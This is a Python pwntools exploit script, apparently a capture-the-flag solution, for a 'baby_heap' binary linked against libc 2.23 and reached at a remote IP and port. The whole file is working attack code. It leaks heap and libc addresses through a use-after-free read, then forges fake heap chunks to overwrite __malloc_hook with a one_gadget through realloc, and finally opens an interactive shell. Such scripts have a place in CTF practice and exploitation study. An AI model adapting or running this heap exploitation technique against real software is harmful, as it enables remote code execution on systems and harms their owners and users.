#!/usr/bin/env python3
from pwn import *
import sys
import pwnlib.shellcraft
import pwnlib
import time

c = 0
pwn_file = "./baby_heap"

elf = ELF(pwn_file)
lib = ELF('./libc-2.23.so')
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 100
context.log_level = 'debug'

debug = 0
if debug == 1:
    ld_str = "./ld-2.23.so.64 --library-path ./ {}".format(pwn_file)
    print(ld_str.split())
    c = process(ld_str.split(), env={'LD_PRELOAD': './libc-2.23.so'})

    elf_path = c.cwd + c.argv[3].decode().strip('.')
    lib_path = c.cwd + '/libc-2.23.so'

    sleep(0.1)
    print(c.libs())
    gdbcmd = '''
    file {} 
    info proc mappings
    set $elf={}
    set $lib={}

    # test hook
    set $free_hook=$lib+0x3c67a8 
    set $malloc_hook=$lib+0x3c4b10
    set $one_gadget=(long)0x4526a
    set $system=0x45390
    set $puts=0x6f690
    set $hook=$malloc_hook
    set $hook=$free_hook
    # set *((long *)$hook)= $lib + $system
    # set *((long *)$hook)= $lib + $one_gadget

    #catch syscall execve
    # b *$lib+0xcc770
    
    # break malloc hook
    b *$lib+0x842a3

    # p $one_gadget
    # p $lib
    # tele $hook
    #c
    '''.format(pwn_file, hex(c.libs()[elf_path]), hex(c.libs()[lib_path]))

    gdb.attach(c, gdbcmd)
else:
    c = remote('140.110.112.77', '4008')

heap_count = 0
def add_heap(size, data):
    c.sendlineafter('>', str(1))
    c.sendlineafter('Size', str(size))
    c.sendafter('Data', data)
    global heap_count
    assert(heap_count < 10)
    heap_count += 1 
    return heap_count - 1

def show_heap(index):
    c.sendlineafter('>', str(2))
    c.sendlineafter('Index :', str(index))

def del_heap(index):
    c.sendlineafter('>', str(3))
    c.sendlineafter('Index :', str(index))

def bye():
    c.sendlineafter('>', str(4))

def leak_heap_base():
    assert(heap_count == 0)
    heap1 = add_heap(0x1, '1')
    heap2 = add_heap(0x1, '1')
    del_heap(heap2)
    del_heap(heap1)
    show_heap(heap1)
    heap_addr = u64(c.recvn(6) + b'\0\0') - 0x20
    print(hex(heap_addr))
    return heap_addr


def leak_libc():
    heap1 = add_heap(0x90, '1')
    heap2 = add_heap(0x90, '1')
    # input()
    del_heap(heap1)
    del_heap(heap2)
    show_heap(heap1)
    libc_addr = u64(c.recvn(6) + b'\0\0') - 0x3c4b78
    print(hex(libc_addr))
    return libc_addr, heap2

heap_base = leak_heap_base()
libc_addr, heap2 = leak_libc()




# one_gadget libc-2.23.so -l10 --raw
one_gadgets = '283158 283242 839923 840136 983716 983728 987463 1009392'.split(' ')
# one_gadget libc-2.23.so --raw
one_gadgets = '283158 283242 983716 987463'.split(' ')

one_gadget = libc_addr + int(one_gadgets[0])

one_gadget = libc_addr + 0xf1147


malloc_hook = libc_addr + 0x3c4b10
call_realloc_hook = libc_addr + 0x846d4

fake_size = 0x60
fake_data = b'a' * (fake_size)
pre_size = 0x90
# p64(malloc_hook +0x20) + p64(malloc_hook +0x20)
#add_heap(0x200, flat(p64(malloc_hook +0x20) + p64(malloc_hook +0x20), length=pre_size) + p64(pre_size) + p64(fake_size+0x10) + fake_data + p64(fake_size) + p64(0x21))
heap3 = add_heap(0x200, b'a' * (0x40 - 8) + p64(pre_size + 0x10) + flat({0x0: p64(0x40 + heap_base) + p64(0x40 + heap_base) +p64(0x0) + p64(0x0) }, length=pre_size) + p64(pre_size + 0x10) + p64(fake_size + 0x10) + fake_data + p64(fake_size + 0x10) + p64(0x21) + b'a' * 0x50)
del_heap(heap3)
del_heap(heap2)
heap3 = add_heap(0x200, b'a' * (0xe0 - 8) + p64(fake_size + 0x10) + p64(malloc_hook-3-0x20))
#heap3 = add_heap(0x200, b'a' * (0x40 - 0x10) + p64(fake_size + 0x10) + p64(fake_size + 0x10) + p64(malloc_hook) + b'a' * (fake_size - 0x8)  + p64(fake_size + 0x10))
heap4 = add_heap(fake_size, b'a' * fake_size)
heap4 = add_heap(fake_size, b'aaa' + p64(one_gadget) * (0x40 // 8 - 6) + p64(call_realloc_hook))


c.sendlineafter('>', '1')
c.sendlineafter('Size', '0')

c.interactive()
c.close()

